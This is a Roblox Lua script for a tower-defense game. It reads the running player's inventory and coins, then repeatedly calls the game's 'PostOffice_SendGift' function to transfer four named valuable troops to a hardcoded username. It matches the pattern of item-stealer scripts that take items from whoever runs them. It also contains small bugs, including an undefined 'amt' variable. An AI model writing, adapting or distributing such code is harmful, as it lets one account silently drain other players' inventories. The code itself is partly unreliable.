local users = {
    "JThvfoqvOG",
}

local troopsToSend = {
    "SantaTVMan",
    "LuckySpeakerman",
    "ClockSpider",
    "GuardianClockman",
}

local TTD
local Network
local Invoke
local Fire

-- Use task.spawn for asynchronous initialization
task.spawn(function()
    -- Assuming MultiboxFramework is correctly imported and initialized
    TTD = require(game:GetService("ReplicatedStorage").MultiboxFramework)
    -- Wait for player data replica
    save = TTD.Replicate:WaitForReplica("PlayerData-" .. game:GetService("Players").LocalPlayer.UserId)

    -- Wait until Network operations are available
    repeat
        pcall(function()
            Network = TTD.Network
            Invoke = Network.Invoke
            Fire = Network.Fire
        end)
        task.wait(0.1)
    until Network ~= nil and Invoke ~= nil and Fire ~= nil
end)

-- Define functions to retrieve player data
local function getInventoryTroops()
    local invTroops = {}
    local save = TTD.Replicate:WaitForReplica("PlayerData-" .. game:GetService("Players").LocalPlayer.UserId)
    for name, v in pairs(save._data.Inventory.Troops) do
        for i, _ in pairs(v) do
            invTroops[i] = name
        end
    end
    return invTroops
end

local function getCoinAmt()
    local coins = 0
    local save = TTD.Replicate:WaitForReplica("PlayerData-" .. game:GetService("Players").LocalPlayer.UserId)
    for i, v in pairs(save._data) do
        if i == "Currencies" then
            coins = v.Coins
            break
        end
    end
    return coins
end

local function hasTroop(id)
    local troops = getInventoryTroops()
    for i, v in pairs(troops) do
        if i == id then
            return true
        end
    end
    return false
end

-- Main logic to send troops to users
for _, user in pairs(users) do
    local sent = {}
    for i, troop in pairs(getInventoryTroops()) do
        if table.find(troopsToSend, troop) and not table.find(sent, troop) then
            table.insert(sent, troop)
            local oldCoins = getCoinAmt()
            local st = tick()
            repeat
                -- Invoke the "PostOffice_SendGift" function with parameters
                Invoke("PostOffice_SendGift", game.Players:GetUserIdFromNameAsync(user), "Troops", i, 0,
                    tostring(math.random(1, 10000)))
                task.wait(0.1)
            -- Wait until coin amount decreases and troop is no longer in inventory
            until getCoinAmt() < oldCoins and not hasTroop(i)
            print("Sent to user:", user, "Time taken:", tick() - st)
        end
    end
    print('Finished user:', user)
end

print('Should have sent:', amt) -- Make sure amt is correctly calculated
